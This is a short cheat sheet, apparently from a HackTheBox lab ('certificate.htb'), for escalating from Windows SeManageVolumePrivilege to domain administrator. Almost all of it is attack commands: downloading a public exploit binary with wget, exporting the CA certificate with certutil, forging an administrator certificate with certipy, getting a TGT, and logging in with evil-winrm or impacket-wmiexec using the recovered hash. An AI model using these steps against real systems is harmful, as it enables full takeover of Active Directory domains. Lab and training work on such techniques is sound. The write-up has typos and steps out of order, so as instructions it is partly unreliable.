# SeManageVolumePrivilege
SeManageVolumePrivilege (Display name: "Perform volume maintenance tasks") is a Windows privilege that allows a user to perform administrative-level operations on storage volumes without needing full Administrator access.

Think of it as being the "storage system administrator" - you can't change user permissions or install software, but you have master keys to work with the hard drives and file systems at a very low level.

# steps
1. Download the Exploit Binary and upload it
2. Create a temp directoty.
3. Export the Certificate and Download it
4. After perform a forge ticket attack
5. Get the TGT and login it

# Download it
```language
wget https://github.com/CsEnox/SeManageVolumeExploit/releases/download/public/SeManageVolumeExploit.exe
upload SeManageVolumeExploit.exe
```
# Make a directory and Execute the exe
```language
.\SeManageVolumeExploit.exe

mkdir C:\tmp
cd C:\tmp
```
# Export certificate and Download 
```language
certutil -exportPFX my "CA Name" C:\tmp\out.pfx

For Example:-
certutil -exportPFX my "Certificate-LTD-CA" C:\tmp\get.pfx

download get.pfx
```
# Forge ticket 
```language
certipy forge -ca-pfx input.pfx -upn administrator@$domain -subject "<admin OU>" -out out.pfx

for Example:-
certipy forge -ca-pfx get.pfx -upn administrator@$certificate.htb -subject "CN=Administrator,CN=Users,DC=certificate,DC=htb" -out out.pfx
```
# Get the TGT
```language
certipy auth -pfx out.pfx -dc-ip $ip  
```
# login it
```language
evil-winrm -i $ip -u "administrator" -H $hash

rlwarp impacket-wmiexec domain/user@<ip> -hashes :<hash>
```
